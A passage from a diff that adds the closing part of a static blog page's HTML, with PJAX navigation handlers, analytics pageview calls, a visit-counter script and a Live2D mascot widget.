+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
